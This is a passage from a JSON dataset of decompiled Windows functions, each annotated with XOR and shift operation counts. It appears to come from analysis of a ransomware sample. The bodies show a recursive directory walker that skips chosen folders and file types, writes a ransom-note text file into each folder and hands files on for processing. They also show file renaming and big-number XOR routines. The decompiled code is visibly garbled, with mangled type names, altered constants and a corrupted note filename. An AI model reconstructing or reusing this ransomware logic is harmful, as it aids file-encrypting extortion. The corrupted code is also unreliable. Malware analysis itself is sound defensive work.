HeapFree(v46, 0, v8);\n    v70 = v77[1];\n    v47 = GetProcessHeap();\n    HeapFree(v47, 0, v70);\n    CloseHandle(v2);\n    v48 = lpExistingFileName;\n    v49 = (_WORD *)&lpExistingFileName + 1;\n    v50 = lpExistingFileName - NewFileName + 1;\n    do\n    {\n      v51 = v49[v50];\n      *++v49 = v51;\n    }\n    while ( v51 );\n    v52 = NewFileName;\n    v53 = &word_408668;\n    while ( *v52++ )\n      ;\n    v55 = v52 - 2;\n    do\n    {\n      v56 = *v53;\n      *++v55 = *v53++;\n    }\n    while ( v56 );\n    v57 = NewFileName;\n    v58 = word_40A51F;\n    while ( *v57++ )\n      ;\n    v60 = v57 - 2;\n    do\n    {\n      v61 = *v58;\n      *++v60 = *v58++;\n    }\n    while ( v61 );\n    return (HAC4F8)MoveFileW(v48, NewFileName);\n  }\n  return result;\n}\n// 403DCC: conditional instruction was optimized away because %FileSize@4.4>=0\n// 4044CD: conditional instruction was optimized away because %FileSize.4>=12375Cu\n// 402BC8: variable 'v41' is possibly undefined\n// 40CD9F: variable 'v64' is possibly undefined\n// 408668: using guessed type __int16 word_408668;\n// 40A51F: using guessed type __int16 word_40A51F[6];\n// 4037E7: using guessed type int dword_4037E7;\n// 4083EA: using guessed type int dword_4083EA;\n\n"
    },
    {
        "Function": "sub_407FFF",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "1.17%",
        "Function Body": "\nint __fastcall sub_407FFF(_DWORD *a1, int *a2)\n{\n  int v3; // eax\n  int v4; // esi\n  int v5; // eax\n  __int128 v6; // xmm3\n  __int128 v7; // xmm2\n  __int128 v8; // xmm5\n  __int128 v9; // xmm4\n  int result; // eax\n  int v11; // esi\n  char *v12; // eax\n  int v13; // ecx\n  unsigned int v14; // eax\n  int v15; // eax\n  __int128 *v16; // ecx\n  int v17; // edx\n  unsigned int v18; // ecx\n  int v19; // esi\n  __int128 v20; // xmm0\n  __int128 v21; // xmm1\n  __int128 v22; // xmm0\n  __int128 v23; // xmm1\n  int i; // eax\n  __m128i *v25; // eax\n  int v26; // ecx\n  _DWORD v27[8]; // [esp+8h] [ebp-80h] BYREF\n  __int128 v28; // [esp+28h] [ebp-60h] BYREF\n  __int128 v29; // [esp+38h] [ebp-50h]\n  __int128 v30; // [esp+48h] [ebp-40h] BYREF\n  __int128 v31; // [esp+58h] [ebp-30h]\n  __int128 v32; // [esp+68h] [ebp-20h] BYREF\n  __int128 v33; // [esp+78h] [ebp-10h]\n  char vars0; // [esp+88h] [ebp+0h] BYREF\n\n  *(_QWORD *)((char *)&v32 + 4) = *(_QWORD *)(a2 + 1);\n  HI70A2D(v32) = a2[3];\n  *(_QWORD *)&v33 = *((_QWORD *)a2 + 2);\n  v3 = a2[6];\n  *a1 = 1;\n  v4 = *a2;\n  DWBE29(v33) = v3;\n  v5 = a2[7];\n  *(_QWORD *)&v30 = 1i64;\n  *((_QWORD *)&v30 + 1) = 1024i64;\n  v6 = v30;\n  *(_QWORD *)&v31 = 0i64;\n  *((_QWORD *)&v31 + 1) = 0x20923500000i64;\n  v7 = v31;\n  v28 = 0ui64;\n  v8 = 0u;\n  v29 = 0ui64;\n  v9 = 0u;\n  LO614CD(v32) = v4;\n  HI70A2D(v33) = v5;\n  a1[1] = 0;\n  a1[2] = 0;\n  a1[3] = 0;\n  a1[4] = 0;\n  a1[5] = 0;\n  a1[6] = 0;\n  a1[7] = 0;\n  while ( 1 )\n  {\n    if ( v4 == 1 )\n    {\n      for ( result = 1; result < 8; ++result )\n      {\n        if ( *((_DWORD *)&v32 + result) )\n          break;\n      }\n      if ( result == 8 )\n        return result;\n    }\n    v11 = 256;\n    v12 = &vars0;\n    while ( 1 )\n    {\n      v13 = *((_DWORD *)v12 - 1);\n      v12 -= 4;\n      if ( v13 )\n        break;\n      v11 -= 32;\n      if ( v11 <= 0 )\n      {\n        if ( !v11 )\n          goto LABEL_13;\n        break;\n      }\n    }\n    v14 = 0x80705700;\n    if ( v13 >= 0 )\n    {\n      do\n      {\n        v14 >>= 1;\n        --v11;\n      }\n      while ( (v13 & v14) == 0 );\n    }\nLABEL_13:\n    v15 = 256;\n    v16 = &v32;\n    while ( 1 )\n    {\n      v17 = *((_DWORD *)v16 - 1);\n      v16 = (__int128 *)((char *)v16 - 4);\n      if ( v17 )\n        break;\n      v15 -= 32;\n      if ( v15 <= 0 )\n      {\n        if ( !v15 )\n          goto LABEL_19;\n        break;\n      }\n    }\n    v18 = 0x80705700;\n    if ( v17 >= 0 )\n    {\n      do\n      {\n        v18 >>= 1;\n        --v15;\n      }\n      while ( (v17 & v18) == 0 );\n    }\nLABEL_19:\n    v19 = v11 - v15;\n    if ( v19 < 0 )\n    {\n      v20 = v32;\n      v19 = -v19;\n      v21 = v33;\n      v32 = v6;\n      v33 = v7;\n      v6 = v20;\n      v7 = v21;\n      v22 = v8;\n      v23 = v9;\n      v8 = *(_OWORD *)a1;\n      v9 = *((_OWORD *)a1 + 1);\n      *(_OWORD *)a1 = v22;\n      v30 = v6;\n      v31 = v7;\n      v28 = v8;\n      v29 = v9;\n      *((_OWORD *)a1 + 1) = v23;\n    }\n    sub_40FDA0(v27, (int *)&v30, v19);\n    for ( i = 0; i < 8; i += 4 )\n      *(__int128 *)((char *)&v32 + i * 4) = (__int128)_mm_xor_si128(\n                                                        *(__m128i *)&v27[i],\n                                                        *(__m128i *)((char *)&v32 + i * 4));\n    sub_40FDA0(v27, (int *)&v28, v19);\n    v25 = (__m128i *)a1;\n    v26 = 2;\n    do\n    {\n      ++v25;\n      v25[-1] = _mm_xor_si128(*(__m128i *)((char *)&v25[-1] + (char *)v27 - (char *)a1), v25[-1]);\n      --v26;\n    }\n    while ( v26 );\n    v4 = v32;\n  }\n}\n// 407FFF: using guessed type _DWORD var_80[8];\n\n"
    },
    {
        "Function": "sub_40D9C9",
        "Total XOR and shift operations": 4,
        "XOR operations": 0,
        "Shift operations": 4,
        "Operation percentage": "0.60%",
        "Function Body": "\nHAC4F8 __thiscall sub_40D9C9(_BYTE *this)\n{\n  _BYTE *v1; // edi\n  __int16 *v2; // edx\n  int v3; // ecx\n  __int16 v4; // ax\n  WCHAR *v5; // ecx\n  const wchar_t *v6; // edx\n  WCHAR *v8; // ecx\n  wchar_t v9; // ax\n  WCHAR *v10; // ecx\n  WCHAR v11; // ax\n  WCHAR *v12; // ecx\n  __int16 *v13; // edx\n  WCHAR *v15; // ecx\n  __int16 v16; // ax\n  WCHAR *v17; // ecx\n  const wchar_t *v18; // edx\n  WCHAR *v20; // ecx\n  wchar_t v21; // ax\n  HAC4F8 FileW; // esi\n  DWORD v23; // ecx\n  HAC4F8 result; // eax\n  int i; // edi\n  int v26; // ecx\n  int v27; // esi\n  int v28; // edx\n  int v29; // ecx\n  int j; // edi\n  int v31; // ecx\n  int v32; // esi\n  int v33; // edx\n  int v34; // ecx\n  int k; // edi\n  int v36; // ecx\n  int v37; // esi\n  int v38; // edx\n  int v39; // ecx\n  int m; // edi\n  int v41; // ecx\n  int v42; // esi\n  int v43; // edx\n  int v44; // ecx\n  int n; // edi\n  int v46; // ecx\n  int v47; // esi\n  int v48; // edx\n  int v49; // ecx\n  int ii; // edi\n  int v51; // ecx\n  int v52; // esi\n  int v53; // edx\n  int v54; // ecx\n  int jj; // edi\n  int v56; // ecx\n  int v57; // esi\n  int v58; // edx\n  int v59; // ecx\n  int kk; // edi\n  int v61; // ecx\n  int v62; // esi\n  int v63; // edx\n  int v64; // ecx\n  int mm; // edi\n  int v66; // ecx\n  int v67; // esi\n  int v68; // edx\n  int v69; // ecx\n  int nn; // edi\n  int v71; // ecx\n  int v72; // esi\n  int v73; // edx\n  int v74; // ecx\n  int i1; // edi\n  int v76; // ecx\n  int v77; // esi\n  int v78; // edx\n  int v79; // ecx\n  int i2; // edi\n  int v81; // ecx\n  int v82; // esi\n  int v83; // edx\n  int v84; // ecx\n  int i3; // edi\n  int v86; // ecx\n  int v87; // esi\n  int v88; // edx\n  int v89; // ecx\n  int i4; // edi\n  int v91; // ecx\n  int v92; // esi\n  int v93; // edx\n  int v94; // ecx\n  WCHAR *v95; // ecx\n  WCHAR v96; // ax\n  WCHAR *v97; // ecx\n  WCHAR *cFileName; // edx\n  WCHAR *v100; // ecx\n  WCHAR v101; // ax\n  WCHAR *v102; // ecx\n  const wchar_t *v103; // edx\n  WCHAR *v105; // ecx\n  wchar_t v106; // ax\n  __int16 *v107; // ecx\n  __int16 v108; // ax\n  WCHAR *v109; // ecx\n  WCHAR *v110; // edx\n  WCHAR *v112; // ecx\n  WCHAR v113; // ax\n  WCHAR *v114; // ecx\n  WCHAR *v115; // esi\n  WCHAR v116; // dx\n  WCHAR v117; // ax\n  WCHAR *v118; // edx\n  int v119; // ecx\n  WCHAR v120; // ax\n  int i5; // edi\n  int v122; // ecx\n  int v123; // esi\n  int v124; // edx\n  int v125; // ecx\n  int i6; // edi\n  int v127; // ecx\n  int v128; // esi\n  int v129; // edx\n  int v130; // ecx\n  int i7; // edi\n  int v132; // ecx\n  int v133; // esi\n  int v134; // edx\n  int v135; // ecx\n  int i8; // edi\n  int v137; // ecx\n  int v138; // esi\n  int v139; // edx\n  int v140; // ecx\n  int i9; // edi\n  int v142; // ecx\n  int v143; // esi\n  int v144; // edx\n  int v145; // ecx\n  WCHAR *v146; // edi\n  int v147; // esi\n  __int16 *v148; // eax\n  int v149; // ecx\n  WCHAR v150; // cx\n  void *v151; // ebx\n  DWORD NumberOfBytesWritten; // [esp+14h] [ebp-86Ch] BYREF\n  struct _WIN32_FIND_DATAW FindFileData; // [esp+18h] [ebp-868h] BYREF\n  WCHAR FileName[259]; // [esp+268h] [ebp-618h] BYREF\n  __int16 v156; // [esp+46Eh] [ebp-412h] BYREF\n  WCHAR v157[259]; // [esp+470h] [ebp-410h] BYREF\n  __int16 v158; // [esp+676h] [ebp-20Ah] BYREF\n  WCHAR v159[260]; // [esp+678h] [ebp-208h] BYREF\n\n  v1 = this;\n  v2 = &v158;\n  v3 = ((this - (_BYTE *)v159) >> 1) + 1;\n  do\n  {\n    v4 = v2[v3];\n    *++v2 = v4;\n  }\n  while ( v4 );\n  v5 = v159;\n  v6 = L\"*.*\";\n  while ( *v5++ )\n    ;\n  v8 = v5 - 2;\n  do\n  {\n    v9 = *v6;\n    *++v8 = *v6++;\n  }\n  while ( v9 );\n  v10 = &FindFileData.cAlternateFileName[13];\n  do\n  {\n    v11 = v10[((v1 - (_BYTE *)FileName) >> 1) + 1];\n    *++v10 = v11;\n  }\n  while ( v11 );\n  v12 = FileName;\n  v13 = word_40A51F;\n  while ( *v12++ )\n    ;\n  v15 = v12 - 2;\n  do\n  {\n    v16 = *v13;\n    *++v15 = *v13++;\n  }\n  while ( v16 );\n  v17 = FileName;\n  v18 = L\"-EN1EA5TED.txt\";\n  while ( *v17++ )\n    ;\n  v20 = v17 - 2;\n  do\n  {\n    v21 = *v18;\n    *++v20 = *v18++;\n  }\n  while ( v21 );\n  FileW = CreateFileW(FileName, 0xC04EB800, 0, 0, 2u, 0, 0);\n  if ( FileW )\n  {\n    v23 = 0;\n    NumberOfBytesWritten = 0;\n    if ( *(_BYTE *)lpBuffer )\n    {\n      do\n        ++v23;\n      while ( *((_BYTE *)lpBuffer + v23) );\n    }\n    WriteFile(FileW, lpBuffer, v23, &NumberOfBytesWritten, 0);\n    CloseHandle(FileW);\n  }\n  result = FindFirstFileW(v159, &FindFileData);\n  NumberOfBytesWritten = (DWORD)result;\n  if ( result != (HAC4F8)-1 )\n  {\n    do\n    {\n      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )\n      {\n        for ( i = 0; ; ++i )\n        {\n          v26 = (unsigned __int16)word_408668[i];\n          v27 = FindFileData.cFileName[i];\n          v28 = v26 + 32;\n          if ( (unsigned int)(v26 - 65) > 0x19 )\n            v28 = (unsigned __int16)word_408668[i];\n          v29 = v27 + 32;\n          if ( (unsigned int)(v27 - 65) > 0x19 )\n            v29 = FindFileData.cFileName[i];\n          if ( v29 != v28 )\n            break;\n          if ( !FindFileData.cFileName[i] )\n            goto LABEL_213;\n        }\n        for ( j = 0; ; ++j )\n        {\n          v31 = (unsigned __int16)word_4037DE[j];\n          v32 = FindFileData.cFileName[j];\n          v33 = v31 + 32;\n          if ( (unsigned int)(v31 - 65) > 0x19 )\n            v33 = (unsigned __int16)word_4037DE[j];\n          v34 = v32 + 32;\n          if ( (unsigned int)(v32 - 65) > 0x19 )\n            v34 = FindFileData.cFileName[j];\n          if ( v34 != v33 )\n            break;\n          if ( !FindFileData.cFileName[j] )\n            goto LABEL_213;\n        }\n        for ( k = 0; ; ++k )\n        {\n          v36 = (unsigned __int16)word_40E920[k];\n          v37 = FindFileData.cFileName[k];\n          v38 = v36 + 32;\n          if ( (unsigned int)(v36 - 65) > 0x19 )\n            v38 = (unsigned __int16)word_40E920[k];\n          v39 = v37 + 32;\n          if ( (unsigned int)(v37 - 65) > 0x19 )\n            v39 = FindFileData.cFileName[k];\n          if ( v39 != v38 )\n            break;\n          if ( !FindFileData.cFileName[k] )\n            goto LABEL_213;\n        }\n        for ( m = 0; ; ++m )\n        {\n          v41 = (unsigned __int16)word_40E929[m];\n          v42 = FindFileData.cFileName[m];\n          v43 = v41 + 32;\n          if ( (unsigned int)(v41 - 65) > 0x19 )\n            v43 = (unsigned __int16)word_40E929[m];\n          v44 = v42 + 32;\n          if ( (unsigned int)(v42 - 65) > 0x19 )\n            v44 = FindFileData.cFileName[m];\n          if ( v44 != v43 )\n            break;\n          if ( !FindFileData.cFileName[m] )\n            goto LABEL_213;\n        }\n        for ( n = 0; ; ++n )\n        {\n          v46 = (unsigned __int16)word_40FC17[n];\n          v47 = FindFileData.cFileName[n];\n          v48 = v46 + 32;\n          if ( (unsigned int)(v46 - 65) > 0x19 )\n            v48 = (unsigned __int16)word_40FC17[n];\n          v49 = v47 + 32;\n          if ( (unsigned int)(v47 - 65) > 0x19 )\n            v49 = FindFileData.cFileName[n];\n          if ( v49 != v48 )\n            break;\n          if ( !FindFileData.cFileName[n] )\n            goto LABEL_213;\n        }\n        for ( ii = 0; ; ++ii )\n        {\n          v51 = (unsigned __int16)word_40BBA0[ii];\n          v52 = FindFileData.cFileName[ii];\n          v53 = v51 + 32;\n          if ( (unsigned int)(v51 - 65) > 0x19 )\n            v53 = (unsigned __int16)word_40BBA0[ii];\n          v54 = v52 + 32;\n          if ( (unsigned int)(v52 - 65) > 0x19 )\n            v54 = FindFileData.cFileName[ii];\n          if ( v54 != v53 )\n            break;\n          if ( !FindFileData.cFileName[ii] )\n            goto LABEL_213;\n        }\n        for ( jj = 0; ; ++jj )\n        {\n          v56 = (unsigned __int16)word_40619B[jj];\n          v57 = FindFileData.cFileName[jj];\n          v58 = v56 + 32;\n          if ( (unsigned int)(v56 - 65) > 0x19 )\n            v58 = (unsigned __int16)word_40619B[jj];\n          v59 = v57 + 32;\n          if ( (unsigned int)(v57 - 65) > 0x19 )\n            v59 = FindFileData.cFileName[jj];\n          if ( v59 != v58 )\n            break;\n          if ( !FindFileData.cFileName[jj] )\n            goto LABEL_213;\n        }\n        for ( kk = 0; ; ++kk )\n        {\n          v61 = (unsigned __int16)word_4002FB[kk];\n          v62 = FindFileData.cFileName[kk];\n          v63 = v61 + 32;\n          if ( (unsigned int)(v61 - 65) > 0x19 )\n            v63 = (unsigned __int16)word_4002FB[kk];\n          v64 = v62 + 32;\n          if ( (unsigned int)(v62 - 65) > 0x19 )\n            v64 = FindFileData.cFileName[kk];\n          if ( v64 != v63 )\n            break;\n          if ( !FindFileData.cFileName[kk] )\n            goto LABEL_213;\n        }\n        for ( mm = 0; ; ++mm )\n        {\n          v66 = (unsigned __int16)word_40B065[mm];\n          v67 = FindFileData.cFileName[mm];\n          v68 = v66 + 32;\n          if ( (unsigned int)(v66 - 65) > 0x19 )\n            v68 = (unsigned __int16)word_40B065[mm];\n          v69 = v67 + 32;\n          if ( (unsigned int)(v67 - 65) > 0x19 )\n            v69 = FindFileData.cFileName[mm];\n          if ( v69 != v68 )\n            break;\n          if ( !FindFileData.cFileName[mm] )\n            goto LABEL_213;\n        }\n        for ( nn = 0; ; ++nn )\n        {\n          v71 = (unsigned __int16)word_40CAC6[nn];\n          v72 = FindFileData.cFileName[nn];\n          v73 = v71 + 32;\n          if ( (unsigned int)(v71 - 65) > 0x19 )\n            v73 = (unsigned __int16)word_40CAC6[nn];\n          v74 = v72 + 32;\n          if ( (unsigned int)(v72 - 65) > 0x19 )\n            v74 = FindFileData.cFileName[nn];\n          if ( v74 != v73 )\n            break;\n          if ( !FindFileData.cFileName[nn] )\n            goto LABEL_213;\n        }\n        for ( i1 = 0; ; ++i1 )\n        {\n          v76 = (unsigned __int16)word_40A448[i1];\n          v77 = FindFileData.cFileName[i1];\n          v78 = v76 + 32;\n          if ( (unsigned int)(v76 - 65) > 0x19 )\n            v78 = (unsigned __int16)word_40A448[i1];\n          v79 = v77 + 32;\n          if ( (unsigned int)(v77 - 65) > 0x19 )\n            v79 = FindFileData.cFileName[i1];\n          if ( v79 != v78 )\n            break;\n          if ( !FindFileData.cFileName[i1] )\n            goto LABEL_213;\n        }\n        for ( i2 = 0; ; ++i2 )\n        {\n          v81 = (unsigned __int16)word_4026DB[i2];\n          v82 = FindFileData.cFileName[i2];\n          v83 = v81 + 32;\n          if ( (unsigned int)(v81 - 65) > 0x19 )\n            v83 = (unsigned __int16)word_4026DB[i2];\n          v84 = v82 + 32;\n          if ( (unsigned int)(v82 - 65) > 0x19 )\n            v84 = FindFileData.cFileName[i2];\n          if ( v84 != v83 )\n            break;\n          if ( !FindFileData.cFileName[i2] )\n            goto LABEL_213;\n        }\n        for ( i3 = 0; ; ++i3 )\n        {\n          v86 = (unsigned __int16)word_40299D[i3];\n          v87 = FindFileData.cFileName[i3];\n          v88 = v86 + 32;\n          if ( (unsigned int)(v86 - 65) > 0x19 )\n            v88 = (unsigned __int16)word_40299D[i3];\n          v89 = v87 + 32;\n          if ( (unsigned int)(v87 - 65) > 0x19 )\n            v89 = FindFileData.cFileName[i3];\n          if ( v89 != v88 )\n            break;\n          if ( !FindFileData.cFileName[i3] )\n            goto LABEL_213;\n        }\n        for ( i4 = 0; ; ++i4 )\n        {\n          v91 = (unsigned __int16)word_40E73F[i4];\n          v92 = FindFileData.cFileName[i4];\n          v93 = v91 + 32;\n          if ( (unsigned int)(v91 - 65) > 0x19 )\n            v93 = (unsigned __int16)word_40E73F[i4];\n          v94 = v92 + 32;\n          if ( (unsigned int)(v92 - 65) > 0x19 )\n            v94 = FindFileData.cFileName[i4];\n          if ( v94 != v93 )\n            break;\n          if ( !FindFileData.cFileName[i4] )\n            goto LABEL_213;\n        }\n        v1 = this;\n        v95 = &FindFileData.cAlternateFileName[13];\n        do\n        {\n          v96 = v95[((this - (_BYTE *)FileName) >> 1) + 1];\n          *++v95 = v96;\n        }\n        while ( v96 );\n        v97 = FileName;\n        cFileName = FindFileData.cFileName;\n        while ( *v97++ )\n          ;\n        v100 = v97 - 2;\n        do\n        {\n          v101 = *cFileName;\n          *++v100 = *cFileName++;\n        }\n        while ( v101 );\n        v102 = FileName;\n        v103 = L\"\\\\\";\n        while ( *v102++ )\n          ;\n        v105 = v102 - 2;\n        do\n        {\n          v106 = *v103;\n          *++v105 = *v103++;\n        }\n        while ( v106 );\n        sub_40D9C9(FileName, v103);\n      }\n      else\n      {\n        v107 = &v156;\n        do\n        {\n          v108 = v107[((v1 - (_BYTE *)v157) >> 1) + 1];\n          *++v107 = v108;\n        }\n        while ( v108 );\n        v109 = v157;\n        v110 = FindFileData.cFileName;\n        while ( *v109++ )\n          ;\n        v112 = v109 - 2;\n        do\n        {\n          v113 = *v110;\n          *++v112 = *v110++;\n        }\n        while ( v113 );\n        v114 = FindFileData.cFileName;\n        v115 = 0;\n        if ( FindFileData.cFileName[0] )\n        {\n          v116 = FindFileData.cFileName[0];\n          do\n          {\n            if ( v116 == 92 || v116 == 32 )\n            {\n              v115 = 0;\n            }\n            else if ( v116 == 46 )\n            {\n              v115 = v114;\n            }\n            v117 = v114[1];\n            ++v114;\n            v116 = v117;\n          }\n          while ( v117 );\n        }\n        v118 = &FindFileData.cAlternateFileName[13];\n        if ( v115 )\n          v114 = v115;\n        v119 = v114 - FileName + 1;\n        do\n        {\n          v120 = v118[v119];\n          *++v118 = v120;\n        }\n        while ( v120 );\n        for ( i5 = 0; ; ++i5 )\n        {\n          v122 = (unsigned __int16)word_40E6F7[i5];\n          v123 = FileName[i5];\n          v124 = v122 + 32;\n          if ( (unsigned int)(v122 - 65) > 0x19 )\n            v124 = (unsigned __int16)word_40E6F7[i5];\n          v125 = v123 + 32;\n          if ( (unsigned int)(v123 - 65) > 0x19 )\n            v125 = FileName[i5];\n          if ( v125 != v124 )\n            break;\n          if ( !FileName[i5] )\n            goto LABEL_213;\n        }\n        for ( i6 = 0; ; ++i6 )\n        {\n          v127 = (unsigned __int16)word_4020DD[i6];\n          v128 = FileName[i6];\n          v129 = v127 + 32;\n          if ( (unsigned int)(v127 - 65) > 0x19 )\n            v129 = (unsigned __int16)word_4020DD[i6];\n          v130 = v128 + 32;\n          if ( (unsigned int)(v128 - 65) > 0x19 )\n            v130 = FileName[i6];\n          if ( v130 != v129 )\n            break;\n          if ( !FileName[i6] )\n            goto LABEL_213;\n        }\n        for ( i7 = 0; ; ++i7 )\n        {\n          v132 = (unsigned __int16)word_403094[i7];\n          v133 = FileName[i7];\n          v134 = v132 + 32;\n          if ( (unsigned int)(v132 - 65) > 0x19 )\n            v134 = (unsigned __int16)word_403094[i7];\n          v135 = v133 + 32;\n          if ( (unsigned int)(v133 - 65) > 0x19 )\n            v135 = FileName[i7];\n          if ( v135 != v134 )\n            break;\n          if ( !FileName[i7] )\n            goto LABEL_213;\n        }\n        for ( i8 = 0; ; ++i8 )\n        {\n          v137 = (unsigned __int16)word_406647[i8];\n          v138 = FileName[i8];\n          v139 = v137 + 32;\n          if ( (unsigned int)(v137 - 65) > 0x19 )\n            v139 = (unsigned __int16)word_406647[i8];\n          v140 = v138 + 32;\n          if ( (unsigned int)(v138 - 65) > 0x19 )\n            v140 = FileName[i8];\n          if ( v140 != v139 )\n            break;\n          if ( !FileName[i8] )\n            goto LABEL_213;\n        }\n        for ( i9 = 0; ; ++i9 )\n        {\n          v142 = (unsigned __int16)word_4068AF[i9];\n          v143 = FileName[i9];\n          v144 = v142 + 32;\n          if ( (unsigned int)(v142 - 65) > 0x19 )\n            v144 = (unsigned __int16)word_4068AF[i9];\n          v145 = v143 + 32;\n          if ( (unsigned int)(v143 - 65) > 0x19 )\n            v145 = FileName[i9];\n          if ( v145 != v144 )\n            break;\n          if ( !FileName[i9] )\n            goto LABEL_213;\n        }\n        v146 = FindFileData.cFileName;\n        if ( FindFileData.cFileName[0] )\n        {\n          v147 = (char *)FindFileData.cFileName - (char *)word_40A51F;\nLABEL_206:\n          v148 = word_40A51F;\n          while ( 1 )\n          {\n            v149 = (unsigned __int16)*v148;\n            if ( !(_WORD)v149 )\n              break;\n            if ( *(unsigned __int16 *)((char *)v148 + v147) == v149 )\n            {\n              if ( *(__int16 *)((char *)++v148 + v147) )\n                continue;\n            }\n            if ( !*v148 )\n              break;\n            v150 = v146[1];\n            ++v146;\n            v147 += 2;\n            if ( v150 )\n              goto LABEL_206;\n            goto LABEL_212;\n          }\n        }\n        else\n        {\nLABEL_212:\n          sub_407603((int)L\"[+] File: \", (__int16 *)v157);\n          sub_401E75(v157);\n        }\nLABEL_213:\n        v1 = this;\n      }\n      v151 = (void *)NumberOfBytesWritten;\n    }\n    while ( FindNextFileW((HAC4F8)NumberOfBytesWritten, &FindFileData) );\n    return (HAC4F8)FindClose(v151);\n  }\n  return result;\n}\n// 40C5CD: conditional instruction was optimized away because cx.2!=0\n// 408A63: using guessed type wchar_t asc_408A63[2];\n// 408668: using guessed type __int16 word_408668[];\n// 409037: using guessed type wchar_t asc_409037[4];\n// 4037DE: using guessed type __int16 word_4037DE[];\n// 40E920: using guessed type __int16 word_40E920[];\n// 40E929: using guessed type __int16 word_40E929[];\n// 40FC17: using guessed type __int16 word_40FC17[];\n// 40BBA0: using guessed type __int16 word_40BBA0[];\n// 40619B: using guessed type __int16 word_40619B[];\n// 4002FB: using guessed type __int16 word_4002FB[];\n// 40B065: using guessed type __int16 word_40B065[];\n// 40CAC6: using guessed type __int16 word_40CAC6[];\n// 40A448: using guessed type __int16 word_40A448[];\n// 4026DB: using guessed type __int16 word_4026DB[];\n// 40299D: using guessed type __int16 word_40299D[];\n// 40E73F: using guessed type __int16 word_40E73F[];\n// 40E6F7: using guessed type __int16 word_40E6F7[];\n// 4020DD: using guessed type __int16 word_4020DD[];\n// 403094: using guessed type __int16 word_403094[];\n// 406647: using guessed type __int16 word_406647[];\n// 4068AF: using guessed type __int16 word_4068AF[];\n// 403433: using guessed type wchar_t aFile[11];\n// 40A51F: using guessed type __int16 word_40A51F[6];\n// 4091D8: using guessed type wchar_t aEncryptedTxt[15];\n\n"
    }
]